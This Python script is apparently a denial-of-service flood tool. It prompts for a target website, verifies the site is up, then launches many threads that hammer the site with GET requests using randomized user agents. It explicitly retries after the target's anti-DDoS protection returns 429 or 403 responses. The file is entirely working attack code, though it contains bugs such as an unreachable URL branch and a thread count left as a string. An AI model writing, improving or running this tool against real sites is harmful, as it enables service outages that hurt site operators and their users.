import time
import sys
import requests
import http_status_code
import multiprocessing

from threading import Thread
from utils import ShowStartMessage, GetuserAgent




ShowStartMessage()
user_random = GetuserAgent()

index = 1

print("Enter Site Address\n in format of https://example.com")
site = input(": ")

if "https://" in site :
    pass
elif not "https://" in site :
    site = f"https://{site}"
elif "http://" in site :
    site = site.replace("http://","https://")




def SendRequest():
    """This Function send request to address"""
    global index, RequestNumber
    print(index >= RequestNumber)

    if index >= RequestNumber:
        sys.exit("All Requests send successfully :)")

        return


    req = requests.get(site, headers=user_random)

    print(f'[INFO] REQUEST NUMBER {index} [{req}] ')

    if req.status_code == http_status_code.HTTP_429_TOO_MANY_REQUESTS:
        print("Too Many Requests (Request Blocked by anti ddos) [Code : 429]")
        time.sleep(10)
        SendRequest()
    if req.status_code == http_status_code.HTTP_403_FORBIDDEN:
        print("Forbidden Error (Request Blocked by anti ddos) [Code : 429]")
        time.sleep(10)
        SendRequest()

    index += 1
    SendRequest()

def site_checking():
    """
        This Function Check Site is AVAILABLE or not
    """
    global site

    try:
        site_check = requests.get(site, headers=user_random, timeout=5)
        statusCode = site_check.status_code

        match statusCode:
            case 200:
                print(f"[OK] Success address is valid starting... [Code : 200]")

            case http_status_code.HTTP_400_BAD_REQUEST:
                print("Bad Request [Code : 400]")
                print("===== Try Again =====")
                site = input("site address: ")
                site_checking()
            case http_status_code.HTTP_500_INTERNAL_SERVER_ERROR:
                print("Internal Server Error [Code : 500]")
                print("===== Try Again =====")
                site = input("site address: ")
                site_checking()
            case http_status_code.HTTP_503_SERVICE_UNAVAILABLE:
                print("Service Unavailable [Code : 503]")
                print("===== Try Again =====")
                site = input("site address: ")
                site_checking()
            case http_status_code.HTTP_429_TOO_MANY_REQUESTS:
                print("Too Many Requests (Request might Blocked by anti ddos) [Code : 429]")
                print("===== Try Again =====")
                site = input("site address: ")
                site_checking()
            case http_status_code.HTTP_403_FORBIDDEN:
                print("Forbidden Error (Request might Blocked by anti ddos) [Code : 403]")
                print("===== Try Again =====")
                site = input("site address: ")
                site_checking()
            case _:
                print(f"another Error [code : {site_check.status_code}]")
                print("===== Try Again =====")
                site = input("site address: ")
                site_checking()

    except requests.exceptions.ConnectTimeout:
        print("The server is offline Please check again when the server is online or check the IP address")
        print("===== Try Again =====")
        site = input("site address: ")
        site_checking()

    except requests.exceptions.ConnectionError:
        print("The server is offline Please check again when the server is online or check the IP address")
        print("===== Try Again =====")
        site = input("site address: ")
        site_checking()



# before sending request check site is AVAILABLE
site_checking()


RequestNumber = int(input("Enter Number of Request:"))
TreadNumber = input("Enter Tread Number: [leave it black for automatically selected]")
if not TreadNumber:
    # num_threads = (num_cpus * 2) + 1
    TreadNumber = (multiprocessing.cpu_count() * 2) + 1

print(f"Number of Treads: {TreadNumber}")


for i in range(TreadNumber):
    newTread = Thread(target=SendRequest)
    newTread.start()

# time.sleep(RUNTIME)
